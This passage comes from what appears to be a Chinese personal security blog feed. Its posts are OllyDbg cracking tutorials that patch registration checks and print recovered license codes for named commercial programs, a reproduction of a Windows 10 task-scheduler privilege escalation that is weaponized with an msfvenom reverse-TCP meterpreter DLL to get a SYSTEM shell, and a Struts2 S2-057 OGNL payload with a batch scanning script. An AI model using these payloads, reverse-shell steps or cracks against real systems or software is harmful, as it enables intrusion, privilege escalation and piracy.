input(‘file:’)<br>    if os.path.exists(user):<br>        print(‘[+] file {} ok’.format(user))<br>    else:<br>        print(‘[-] not file {}’.format(user))<br>        exit()</p><pre><code>dk=open(&#39;{}&#39;.format(user),&#39;r&#39;)for d in dk.readlines():    qc=&quot;&quot;.join(d.split(&#39;\n&#39;))    t=threading.Thread(target=exploit,args=(qc.rstrip(&#39;/&#39;),))    t.start()</code></pre><p><code></code><br>测试结果：<br><img src="https://s1.ax1x.com/2018/09/07/iPe941.png" alt="iPe941.png" border="0"></p><p><img src="https://s1.ax1x.com/2018/09/07/iPepNR.png" alt="iPepNR.png" border="0"></p><p><img src="https://s1.ax1x.com/2018/09/07/iPeMCt.md.png" alt="iPeMCt.md.png"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>破解QQ传情</title>
      <link href="/posts/fdcbf63c.html"/>
      <url>/posts/fdcbf63c.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今天暑假最后一天，我特么的不想上学。回到学校见到特么63个男的加见到丑的一批的班主任，就忍不住把那些老师全部打死，天天拿毕业证说事。<br><img src="https://s1.ax1x.com/2018/09/01/PxF9mT.jpg" alt="PxF9mT.jpg"> <img src="https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/u=3988330260,3412584568&amp;fm=26&amp;gp=0.jpg" alt="u=3988330260,3412584568&amp;fm=26&amp;gp=0.jpg"></p><p><code>猫女被打爆了头...</code></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>恒大的课程看到了第九课，第八课的课件失踪了。到时候补上，我们拿到的课件的软件名叫做<br>QQ传情= =，这名字。。不管了，先来看看软件<br>首先打开软件，发现他让你注册，注册码瞎几把乱填。<br><img src="https://s1.ax1x.com/2018/09/01/PxF3hd.md.png" alt="PxF3hd.md.png"><br>然后点击注册软件，让你重启验证。<br><img src="https://s1.ax1x.com/2018/09/01/PxFG9A.png" alt="PxFG9A.png"><br>注册码当然是错误的，我们可以发现文件夹里有几个ini配置文件，值得关注的是Config.ini我们按进去看看打开软件也是没用注册。这里也没用像星空网游的那个软件一样重启验证后有提示，也就是说我们这里没用关键字！那我们该怎么办？先关闭软件吧。<br><img src="https://s1.ax1x.com/2018/09/01/PxFtjP.md.png" alt="PxFtjP.md.png"><br>然后查壳<br><img src="https://s1.ax1x.com/2018/09/01/PxFe6x.md.png" alt="PxFe6x.md.png"><br>无壳，然后载入OD<br><img src="https://s1.ax1x.com/2018/09/01/PxFK0O.png" alt="PxFK0O.png"><br>按照课程思路，按BP下一个<code>GetPrivateProfileStringA断点</code><br>(这个断点专门用来搞ini重启验证的)<br>然后F9运行程序，发现程序断在了断点上<br><img src="https://s1.ax1x.com/2018/09/01/PxFcj0.md.png" alt="PxFcj0.md.png"><br>然后我们发现我们从<code>程序领空进入到了系统领空</code>。</p><pre><code>程序领空：OD左上角文件名如果文件是程序名就是程序领空系统领空：OD左上角文件名如果不是程序名的话就是系统领空</code></pre><p>系统领空<br><img src="https://s1.ax1x.com/2018/09/01/PxFoC9.md.png" alt="PxFoC9.md.png"><br>按Alt+F9或者调试按执行到用户代码跳出系统领空。<br>(跳到了程序领空)<br><img src="https://s1.ax1x.com/2018/09/01/PxF7g1.md.png" alt="PxF7g1.md.png"><br>F8单步往下走<br><img src="https://s1.ax1x.com/2018/09/01/PxFHjx.md.png" alt="PxFHjx.md.png"><br>发现了机器码，继续单步<br>发现一个retn 跳出<br><img src="https://s1.ax1x.com/2018/09/01/PxFqu6.md.png" alt="PxFqu6.md.png"><br>继续单步<br>又跳过了一个retn之后我们又一次的进入了<code>系统领空</code><br><img src="https://s1.ax1x.com/2018/09/01/PxFLDK.md.png" alt="PxFLDK.md.png"><br>Alt+F9再次跳出<br><img src="https://s1.ax1x.com/2018/09/01/PxFx4H.md.png" alt="PxFx4H.md.png"><br>之后我们发现了我们输入的假码<br><img src="https://s1.ax1x.com/2018/09/01/PxkSCd.png" alt="PxkSCd.png"><br>继续F8到retn 跳出这个call<br>又一次出现了我们的机器码，这是不是说明真码离我们很近了呢？<br><img src="https://s1.ax1x.com/2018/09/01/PxkKvq.md.png" alt="PxkKvq.md.png"><br>发现一个可疑字符串，将其复制到剪切板，继续单步往下走<br><img src="https://s1.ax1x.com/2018/09/01/Pxk0r6.md.png" alt="Pxk0r6.md.png"><br>在一次发现可疑字符串，记录下来。现在把OD关掉试一下注册码<br><img src="https://s1.ax1x.com/2018/09/01/PxkqRs.md.png" alt="PxkqRs.md.png"></p><p><img src="https://s1.ax1x.com/2018/09/01/PxAiW9.png" alt="PxAiW9.png"><br>第一次可疑字符串失败，第二个成功，所以<code>acdb9da597f5276c6e4aae7dd29b7524</code>就是注册码<br><img src="https://s1.ax1x.com/2018/09/01/PxAEsx.png" alt="PxAEsx.png"><br>转载请声明转自：422926799.github.io<br>我们下个星期在见<img src="https://s1.ax1x.com/2018/09/01/PxAmdO.png" alt="PxAmdO.png"></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>破解星空网游LEG阿里云破解补丁</title>
      <link href="/posts/f2b8431a.html"/>
      <url>/posts/f2b8431a.html</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>Shark恒第七课，从这个PE中寻找真的注册码。虽然之前也说过，不过这个有点不一样。所以学习完之后这里做个总结。<br><img src="https://s1.ax1x.com/2018/08/31/Pv3sYt.jpg" alt="Pv3sYt.jpg"></p><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>首先我们来分析一下软件，我们输入注册码后他会将注册码写入到配置文件，然后进行重启验证。<br>由此我们可以判断，他是打开ini读取里面的配置和真码进行比较。我们要做的就是将软件停留在那段时间。<br><img src="https://s1.ax1x.com/2018/08/31/Pv8E0H.md.png" alt="Pv8E0H.md.png"><br>常规操作先查壳，在载入OD。<br><img src="https://s1.ax1x.com/2018/08/31/Pv3Tf0.png" alt="Pv3Tf0.png"><br>vmp的壳，然后载入OD<br><img src="https://s1.ax1x.com/2018/08/31/Pv8M1f.md.png" alt="Pv8M1f.md.png"><br>在API断点下一个ReadFile断点<br><img src="https://s1.ax1x.com/2018/08/31/Pv8YAs.md.png" alt="Pv8YAs.md.png"><br>F9运行程序，发现程序成功的断在了读取文件的位置<br><img src="https://s1.ax1x.com/2018/08/31/Pv8cNR.md.png" alt="Pv8cNR.md.png"><br>Ctrl+G输入401000去到解码处，为什么要去解码处呢？因为有壳<br><img src="https://s1.ax1x.com/2018/08/31/Pv8hjO.md.png" alt="Pv8hjO.md.png"><br>中文搜索引擎-&gt;ASCII搜索-&gt;发现关键字<br><img src="https://s1.ax1x.com/2018/08/31/Pv8b4I.md.png" alt="Pv8b4I.md.png"><br>双击跳反汇编窗口，发现关键跳<br><img src="https://s1.ax1x.com/2018/08/31/PvG9Ej.md.png" alt="PvG9Ej.md.png"><br>在关键跳下断点，停止掉读取文件的断点<br><img src="https://s1.ax1x.com/2018/08/31/PvGA2V.png" alt="PvGA2V.png" border="0"></p><p><img src="https://s1.ax1x.com/2018/08/31/PvGk80.png" alt="PvGk80.png" border="0"><br>F9运行程序，发现真码！！！<br><img src="https://s1.ax1x.com/2018/08/31/PvGaad.png" alt="PvGaad.png" border="0"><br>真码为12759E371EF9175DC77CC79BC7716312<br><img src="https://s1.ax1x.com/2018/08/31/PvGUVH.png" alt="PvGUVH.png" border="0"><br>关闭OD输入注册码，发现注册成功<br><img src="https://s1.ax1x.com/2018/08/31/PvGTMT.png" alt="PvGTMT.png" border="0"><br><img src="https://s1.ax1x.com/2018/08/31/PvGIzV.png" alt="PvGIzV.png" border="0"><br>转载请声明：来自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>windows-提权0day-复现</title>
      <link href="/posts/c24b1fd3.html"/>
      <url>/posts/c24b1fd3.html</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><embed src="//music.163.com/style/swf/widget.swf?sid=33856586&type=2&auto=1&width=320&height=66" width="340" height="86" allownetworking="all"><p>win10中任务调度服务导出的函数没有验证调用者的权限，任意权限的用户调用该函数可以获取系统敏感文件的写权限，进而提权。影响范围：windows10，windows server 2016昨天群里的基友们都复现了一遍也都成功了，也有基友在windows8实验了发现了也能提权成功。</p><p><img src="https://s1.ax1x.com/2018/09/01/Pximdg.jpg" alt="Pximdg.jpg" border="0"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>准备工作：下载POC，windows 10 镜像，Process Explorer，CFF<br>POC：<a href="https://github.com/SandboxEscaper/randomrepo" target="_blank" rel="noopener">GitHub - SandboxEscaper/randomrepo: Repo for random stuff</a><br>windows10 ISO:msdn下载<br>Process Explorer：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer" target="_blank" rel="noopener">Process Explorer - Windows Sysinternals | Microsoft Docs</a><br>CFF:<a href="https://ntcore.com/?page_id=388" target="_blank" rel="noopener">Explorer Suite – NTCore</a></p><p>首先打开一个notepad<br><img src="https://s1.ax1x.com/2018/09/01/Pxi3Q0.png" alt="Pxi3Q0.png" border="0"><br>并没有什么不同，执行<br><img src="https://s1.ax1x.com/2018/09/01/PxinoQ.md.png"><br>带有子进程conhost和notepad的cmd.exe已经生成为SYSTEM！</p><h3 id="将其武器化"><a href="#将其武器化" class="headerlink" title="将其武器化"></a>将其武器化</h3><p>在kali执行 <code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f dll &gt; ka.dll</code><br><img src="https://s1.ax1x.com/2018/08/31/PvFgQP.md.png" alt=""><br>移动到windows10<br><img src="https://s1.ax1x.com/2018/09/01/PxiMJs.md.png"><br>在CFF打开<code>ALPC-TaskSched-LPE.dll</code>替换其msf生成的dll，然后保存<br><img src="https://s1.ax1x.com/2018/09/01/PxiGLT.md.png"></p><p><img src="https://s1.ax1x.com/2018/09/01/PxiQWn.md.png"><br>kali中执行监听命令<br><img src="https://s1.ax1x.com/2018/09/01/PxiVL8.md.png"><br>windows 10中执行<br><img src="https://s1.ax1x.com/2018/09/01/PxiEsf.md.png"><br>返回kali可以发现已经成功的反弹了一个meterpreter，并且是system权限<br><img src="https://s1.ax1x.com/2018/09/01/Pxilzq.md.png"></p><p><img src="https://s1.ax1x.com/2018/09/01/Pxi8yV.md.png"></p><p><img src="https://s1.ax1x.com/2018/09/01/PxieeS.md.png"></p><p>分析此0day的文章：<a href="https://www.anquanke.com/post/id/158293" target="_blank" rel="noopener">漏洞预警 | Windows 10本地提权0day预警 - 安全客，安全资讯平台</a><br>转载请注明来自：422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>文件巴士破解</title>
      <link href="/posts/bdce5981.html"/>
      <url>/posts/bdce5981.html</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>看到恒大教程的第六课，vmp壳的爆破。然后按照教程上的软件找，发现完全不是一个壳。我日….啊，这篇当做复习在壳中破解吧。<br><img src="https://i.imgur.com/udnIbzS.jpg" alt=""></p><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>首先查壳<br><img src="https://i.imgur.com/02YASBk.png" alt=""><br>UPX的壳，不管他。不影响大局<br>将文件巴士拖入OD<br><img src="https://i.imgur.com/dFTGw0D.png" alt=""><br>直接运行软件，然后按F9跳转到401000<br><img src="https://i.imgur.com/z0m2Fs7.png" alt=""><br>搜索关键字(注册失败）<br><img src="https://i.imgur.com/xBB90rd.png" alt=""><br>双击跳转到反汇编窗口区域<br><img src="https://i.imgur.com/hNoUCtL.png" alt=""><br>往上找跳转<br><img src="https://i.imgur.com/FtVenyN.png" alt=""><br>发现关键跳，直接跳过了正确。使用noop填充<br><img src="https://i.imgur.com/YiBYNbE.png" alt=""><br>运行软件，乱输即可注册成功<br><img src="https://i.imgur.com/Y9vHv31.png" alt=""><br>转载请声明来自:422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>关键call和关键跳</title>
      <link href="/posts/f60102e8.html"/>
      <url>/posts/f60102e8.html</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>恒大的教程去到第五课，关修改关键call的值实现破解。这里也跟着学习了一遍，关键跳的上面有个关键call。而关键call是决定关键跳是否跳转的主要因素。</p><p><img src="https://i.imgur.com/HiZBHxU.jpg" alt=""></p><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>这里用到的是教程里面的视频转换专家，百度上找一个下载。<br>首先先查壳<br><img src="https://i.imgur.com/a5ubBJ7.png" alt=""><br>查壳之后发现无壳，拖入OD进行分析。<br><img src="https://i.imgur.com/kMoWiy7.png" alt=""><br>搜索关键字”注册”，找到一个双击跳转<br><img src="https://i.imgur.com/5MqKTN6.png" alt=""><br><img src="https://i.imgur.com/UH6FmTP.png" alt=""><br>往上移看看能不能找到什么线索，发现一个跳转<br><img src="https://i.imgur.com/8i3Rh8A.png" alt=""><br>这个跳转跳过了注册成功，我们不要让他成功，可以使用Noop填充之类的操作。但是我们这次要学习的修改call的值，我们看看上面的call。下个断点，然后F9运行程序输入假码看看。<br><img src="https://i.imgur.com/CcaSR3l.png" alt=""><br>从call中我们可以发现，里面有我们输入的假码。F8单步像下看看<br><img src="https://i.imgur.com/H9oJZqc.png" alt=""><br>test al,al 可以看出EAX和ECX在进行比较。如果为1则注册成功，如果为0则注册不成功。而这一切的罪魁祸首就是call，所以我们进入call中进行修改(手动滑稽啦)<br><img src="https://i.imgur.com/bxQQwIT.jpg" alt=""><br>F7进入call<br><img src="https://i.imgur.com/Ek3PAwh.png" alt=""><br>修改如下图所示<br>mov eax,1(将1赋值给eax) retn（退出call）<br><img src="https://i.imgur.com/H11hDP7.png" alt=""><br>然后选择修改的部分复制到可执行文件，将其保存。<br><img src="https://i.imgur.com/Dkdk4bL.png" alt=""><br>发现已经按不了了，代表已经注册了。</p><p>转载请注明:来自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>去除文件自效验</title>
      <link href="/posts/8e2ff5f8.html"/>
      <url>/posts/8e2ff5f8.html</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>学到Shark恒的第四课，去除文件自效验。何为文件自效验呢？当你脱壳之后，因为现在壳都有压缩功能。所有脱壳之后文件会变大，如果文件变大了。如果PE有检测文件大小功能，如果文件大小不等于<br>有壳时候的大小就会退出PE。判断是否有自效验就是，脱壳后PE打不开。<br><img src="https://i.imgur.com/cqRHQZL.jpg" alt=""></p><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>首先下载课程中所用到的，木马杀客</p><pre><code>http://www.xdowns.com/soft/8/21/2006/Soft_29666.html</code></pre><p>首先下载出来之后。我们把exe拖入进行检测，发现有个壳子。<br><img src="https://i.imgur.com/qQO7Bfi.png" alt=""><br>拖入OD，发现可以用ESP定律脱掉(ESP定律昨天我已经说过了这里就不重复多说)<br><img src="https://i.imgur.com/MIUZtOT.png" alt=""><br>脱掉壳之后的对比和大小<br><img src="https://i.imgur.com/unSY03R.png" alt=""></p><p><img src="https://i.imgur.com/0Y0iO8j.png" alt=""><br>运行1.exe发现打不开(判断有文件自效验)。将1.exe拖入OD，点击常用API断点设置，设置文件大小断点。<br><img src="https://i.imgur.com/Z5yzVqr.png" alt=""><br>F9运行。<br><img src="https://i.imgur.com/509GloA.png" alt=""><br>右键反汇编窗口跟随<br><img src="https://i.imgur.com/OiZDMpG.png" alt=""><br>跳到判断参数，下断点<br><img src="https://i.imgur.com/Ulg1W0P.png" alt=""><br>将文件大小那个断点禁止。<br><img src="https://i.imgur.com/InDNk8n.png" alt=""><br>F9运行，发现断在了这个位置<br><img src="https://i.imgur.com/bKb8LPi.png" alt=""><br>F8单步…<br><img src="https://i.imgur.com/Wo0uEki.png" alt=""><br>（cmp:cmp用于比较两个数值的大小，如果不是加壳后的大小则会直接return退出）这里我们不能让他退出，对两个cmp使用noop填充。<br><img src="https://i.imgur.com/xiRWY4c.png" alt=""><br>复制到可执行文件然后保存<br><img src="https://i.imgur.com/luAvfEa.png" alt=""><br>保存为2.exe<br><img src="https://i.imgur.com/5gh69iv.png" alt=""><br>成功打开<br><img src="https://i.imgur.com/33Z3fqB.png" alt=""><br>转载请注明转自:422926799.github.io<br>欢迎加入即刻安全技术交流群:307283889</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ESP定律</title>
      <link href="/posts/7e162ea7.html"/>
      <url>/posts/7e162ea7.html</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>Shark恒的教程，学到第四课，自验证涉及到ESP定律进行脱壳。然后我去看了一遍，发现还行。这里做个总结。</p><p><img src="https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=4065195853,3923124275&amp;fm=11&amp;gp=0.jpg" alt=""></p><pre><code>全职猎人看到了嵌合蚁篇</code></pre><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>首先这里自己找个exe用吾爱工具的，ASP加壳工具进行加壳。用PEID查壳可以发现是ASP壳<br><img src="https://i.imgur.com/AP2j6lR.png" alt=""><br>拖入OD，并进行一次单步，发现有Pushad而且单步之后也只有ESP后面出现红色说明可以使用ESP定律进行脱壳<br><img src="https://i.imgur.com/k2RDX53.png" alt=""><br>然后将鼠标移到ESP值那里右键单击数据窗口中跟随<br><img src="https://i.imgur.com/8aQCmo2.png" alt=""><br>选中跟随的值，多少无所谓只要是开头的就行<br><img src="https://i.imgur.com/uwvXxbY.png" alt=""><br>右键单击断点，硬件断点，三选一<br><img src="https://i.imgur.com/2jsRRPp.png" alt=""><br>断点之后按调试-&gt;硬件断点可以看见<br><img src="https://i.imgur.com/MRJtmJH.png" alt=""><br>按F9运行，然后F8单步(让他跳到call)<br><img src="https://i.imgur.com/mtcu2kb.png" alt=""><br>鼠标右键点击插件进行脱壳，保存<br><img src="https://i.imgur.com/THC7jZC.png" alt=""><br>在次查壳，发现已经脱了。<br><img src="https://i.imgur.com/finyVAV.png" alt=""></p><p>ESP定律还有更简单的方法，就是你单步了之后把鼠标移到ESP值那里选择ESP那个插件，然后步骤同上。</p><p>转载请注明来自：422926799.github.io</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>破解飞扬英语2010版</title>
      <link href="/posts/8bbe2fae.html"/>
      <url>/posts/8bbe2fae.html</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>每天睡觉前看个Shark恒的破解教程，起床来学破解。真特么的爽歪歪，我看到了第三课，然后我们就来破解吧。<br><img src="https://i.imgur.com/EyXI3m8.jpg" alt=""></p><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>首先下载教程里面所说的exe，飞扬英语学习(带壳破解)：</p><pre><code>http://www.greenxf.com/soft/20907.html</code></pre><p>之后先安装，查壳。<br><img src="https://i.imgur.com/KjtpqsM.png" alt=""><br>运行exe点击购买，随便输用户名和注册码<br><img src="https://i.imgur.com/4Ixm1qZ.png" alt=""><br>然后软件会让你重启<br><img src="https://i.imgur.com/L6AyPWF.png" alt=""><br>之后将软件拖入到OD，打开<br><img src="https://i.imgur.com/RBMX7A9.png" alt=""><br>因为是带壳所以会出现以上毛病，点是或否就行，然后F9运行<br><img src="https://i.imgur.com/IPkTpGj.png" alt=""><br>回到教程，按Ctrl+G或者黑色的箭头-&gt;输入401000<br><img src="https://i.imgur.com/ZFaU1B3.png" alt=""><br>(401000跳转到头部，根据Shark恒所说%90的壳可以成功)<br><img src="https://i.imgur.com/3iZF6do.png" alt=""><br>然后可以看见脱离了壳<br><img src="https://i.imgur.com/zhBIgmi.png" alt=""><br>点击分析-&gt;从模块中删除数据分析<br><img src="https://i.imgur.com/zBcE7FY.jpg" alt=""><br>就会恢复正常，然后中文搜索-&gt;智能搜索（未购买）<br><img src="https://i.imgur.com/ZZ7UqQP.png" alt=""><br>双击跳转到CPU区<br><img src="https://i.imgur.com/rPXGmYP.png" alt=""><br>向上找找存储的地方，然后发现了注册表的路径，我们给他加个注释<br><img src="https://i.imgur.com/P1mfRXv.png" alt=""><br>然后F2断点<br><img src="https://i.imgur.com/KB5S9az.png" alt=""><br>按那个嘿嘿的返回键，返回，点击插件-&gt;常用API插件找到启动断点的<br><img src="https://i.imgur.com/FpgBtbQ.jpg" alt=""><br>因为有壳所有会出现以下这点（确认即可）<br><img src="https://i.imgur.com/7DUfyoD.png" alt=""></p><p><img src="https://i.imgur.com/nDtcQ4p.png" alt=""><br>按F9运行<br><img src="https://i.imgur.com/2dWYuEd.png" alt=""><br>然后按OD列表上方的b按钮，跳到断点设置将获取启动信息的断点停止，注册表设置的断点启动。<br><img src="https://i.imgur.com/av5V7q6.png" alt=""><br><img src="https://i.imgur.com/jkoO7rv.png" alt=""><br>之后返回到反汇编区，按F9再次运行，发现断点成功断到了注册表那里<br><img src="https://i.imgur.com/JtZRacM.png" alt=""><br>慢慢的往下面单步就可以发现真码了（注册码）<br><img src="https://i.imgur.com/nylj5Q1.png" alt=""></p><p><img src="https://i.imgur.com/gWTHuOf.png" alt=""></p><p><img src="https://i.imgur.com/XHF5j1G.png" alt=""></p><p><img src="https://i.imgur.com/vfb0kXt.png" alt=""><br>复制出真码将其注册<br><img src="https://i.imgur.com/W5iYK7q.png" alt=""></p><p><img src="https://i.imgur.com/hDckGp3.png" alt=""></p><p><img src="https://i.imgur.com/Cf5Gb6P.png" alt=""></p><p>破解成功（带壳寻找注册码）。</p><p>这三天来的总结</p><pre><code>带壳寻找注册码（90%的壳可以用401000找到初始位）PEID查壳，把exe拖入OD，直接运行程序。因为带壳，按Ctrl+g或黑色的向前指的箭头，输入401000。如果未解码，则按分析-&gt;删除模块分析然后进行智能搜索搜索关键字（未购买），然后双击跳到CPU区。往上寻找“注册表的路径”。找到之后按F2下好断点，之后按&lt;&lt;&lt;退回键按API断点工具-&gt;常用断点工具-&gt;常用断点工具，勾选&quot;初始化断点&quot;确定。按F9发现程序被断了，之后在OD上方列表找到b。按b将初始化断点禁用，注册表那个断点开启，然后按F9，跳到注册表那个断点哪里。按F8进行单步调试，之后你会看到假码和真码，一般来说如果有真码的话CPU区的左侧第三栏会出现一个0x几的。然后发现下一步是对比用户名和真码，这就是真码了。Shark恒的第三课利用了，软件在输入后重启那段空间把软件进行断了下来然后搜索真码存在的路径，进行调试从而找到真码破解不联网登陆软件常规思路就是:查壳，脱壳，然后拖入od，看看他有没有跳过什么，如果是红色线跳转的话noop填充把跳转删了，如果是灰色线跳转不超过的话，把开始跳转的汇编代码改为jmp 无条件跳转，如果有个x前面加个0</code></pre><p>转载请注明文章来自：422926799.github.io<br>欢迎加入即刻安全技术交流群：307283889</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>破解劳保用户管理系统</title>
      <link href="/posts/10ddccc5.html"/>
      <url>/posts/10ddccc5.html</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>昨天在即刻群里面窥屏，发现一个shark恒的破解教程。我用“念”去查看，嗯发现这是个不错的东西（完全扯淡），昨天晚上就看了。心里痒想破解（手动滑稽），今天下午找到了劳保管理系统2012的软件，破解成功了。故此来做个记录<br><img src="https://i.imgur.com/IHsMSOc.jpg" alt=""></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>首先劳保软件管理系统下载：<a href="http://www.duote.com/soft/121.html" target="_blank" rel="noopener">http://www.duote.com/soft/121.html</a><br>准备好工具，OD，EXEInfoPE或者PEID<br>按照昨天学习的操作：</p><pre><code>先查壳，将下载好的exe拖入EXEInfoPE查壳（我这里用的是EXEInfoPE）</code></pre><p><img src="https://i.imgur.com/1OVe1zG.png" alt=""><br>没有壳，进行软件测试。</p><pre><code>打开界面，瞎输，发现有4次机会，如果全部错误则会弹出登陆框</code></pre><p><img src="https://i.imgur.com/FzvkjGy.png" alt=""></p><p><img src="https://i.imgur.com/wEbItRg.png" alt=""><br>继续回到昨天的操作，将exe拖入到OD里面<br><img src="https://i.imgur.com/oPwcGHf.png" alt=""><br>进行字符搜索，搜索关键字：密码错误<br><img src="https://i.imgur.com/vKi8lYJ.png" alt=""><br>双击跳到，CPU区。<br><img src="https://i.imgur.com/C6mF7FE.png" alt=""></p><pre><code>从图中可以看出 &gt; //跳转符还有红色的线代表跳转，灰色的线代表跳转不成功</code></pre><p>现在移到红线的上方<br><img src="https://i.imgur.com/EFZFAsD.png" alt=""><br>jnz代表条件跳转<br><img src="https://i.imgur.com/9h0x7X8.png" alt=""><br>然后我们下个断点，进行软件运行测试。<br><img src="https://i.imgur.com/wgg4U5B.png" alt=""><br>运行软件，发现断点的地方变成白底红字（说明软件运行在这了）<br><img src="https://i.imgur.com/VX9WTO7.png" alt=""><br>F8单步调试，看看<br><img src="https://i.imgur.com/bourawt.png" alt=""><br>跳转到了密码错误，在回到昨天晚上学习的操作，在断点处进行Noop填充<br><img src="https://i.imgur.com/HFK6Exo.png" alt=""><br>noop填充就是，等于把这个跳转删除了。然后在单步看看<br><img src="https://i.imgur.com/enL8Ce4.png" alt=""><br>跳过了密码错误，我们在运行软件看看</p><p>乱输一通，发现登陆成功了！！！<br><img src="https://i.imgur.com/sfeDmnM.png" alt=""><br><img src="https://i.imgur.com/9ZJUHyh.png" alt=""><br>然后破解的软件即可。</p><p><strong>总结：</strong></p><pre><code>逆向第一课总结:1.首先判断软件有没有加壳，用peid看，如果加了壳就找对应的脱壳工具，进行脱壳。2.然后运行软件，观察软件的运行。获取关键字。如:密码错误的那个3.把软件拖入od进行搜索关键字，双击关键字的那行。然后跳到CPU区，进行断点。f6运行程序看程序是不是跳到哪里。如果跳转成立的线是红色的，不成立则为灰色，跳转标识符&gt;，然后进行noop填聪(就是什么也没有)，然后软件就破解了。自己可以考虑用C写个简单的登陆程序，进行破解。完毕注意:搜索用智能搜索，搜索关键字要模糊化，不要全部打上。搜索跳转到CPU区之后先看软件的运行流程，分析软件，下断点，按f6运行程序进行调试。然后进行下一步。破解完后如果要进行保存，点击复制到可执行文件，选择，保存文件。给他取个名字</code></pre><p>欢迎加入即刻安全技术交流群：307283889<br>转载请声明转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>St2-057复现</title>
      <link href="/posts/c6d4c6f1.html"/>
      <url>/posts/c6d4c6f1.html</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>距离愉快的暑假还有10天左右、、十分不想上学…..,今天呢st-057的细节和复现教程出炉了。抱着一试的决心，emm失败了。还好下午有为潜水大佬出来送了份环境<br><img src="https://i.imgur.com/yT2oSJ3.jpg" alt=""></p><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>漏洞介绍：<br><img src="https://i.imgur.com/WCtYf57.png" alt=""><br>漏洞详情：</p><pre><code>https://github.com/vulhub/vulhub/tree/master/struts2/s2-048https://lgtm.com/blog/apache_struts_CVE-2018-11776https://cwiki.apache.org/confluence/display/WW/S2-057https://www.anquanke.com/post/id/157518</code></pre><p><strong>搭建st2-057环境：</strong><br>这里有两种方法：</p><pre><code>1.按照少宇师傅的方法来搭建，但是我失败了。链接：https://github.com/jas502n/St2-057/2.用潜水大佬给我的环境，环境下载：https://pan.baidu.com/s/1lXIHwqEQP-bjqw5A4fvOIA 密码: b7k6 github下载地址：https://github.com/422926799/st2-057</code></pre><p>如果你选择按照少宇师傅的搭建方法则看<a href="https://github.com/jas502n/St2-057/" target="_blank" rel="noopener">https://github.com/jas502n/St2-057/</a></p><p>回到正题，下载之后。</p><pre><code>unzip cve201811776.zipdocker-compose up -d</code></pre><p>访问：<a href="http://127.0.0.1/struts2-showcase" target="_blank" rel="noopener">http://127.0.0.1/struts2-showcase</a><br><img src="https://i.imgur.com/BZmoCIq.png" alt=""><br>根据少宇师傅的教程，加入payload${(111+111)}</p><pre><code>http://www.127.0.0.1:8080/struts2-showcase/${(111+111)}/actionChain1.action</code></pre><p>然后测试结果如下：<br><img src="https://i.imgur.com/8L24a6G.png" alt=""><br><img src="https://i.imgur.com/zciP0nQ.png" alt=""><br>其他payload我试了不行，如果要试请自行测试。</p><p>然后我们可以通过上面的那个payload写一个批量测试St2-057的脚本：<br><strong>代码：</strong></p><pre><code>import requestsimport threadingimport osxh=open(&#39;save.txt&#39;,&#39;w&#39;)xh.close()def scan(url):    payload=&#39;${(111+111)}&#39;    urls=&#39;{}/struts2-showcase&#39;.format(url)+&#39;/struts2-showcase/{}/actionChain1.action&#39;.format(payload)    headers={&#39;user-aget&#39;:&#39;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36&#39;}    try:        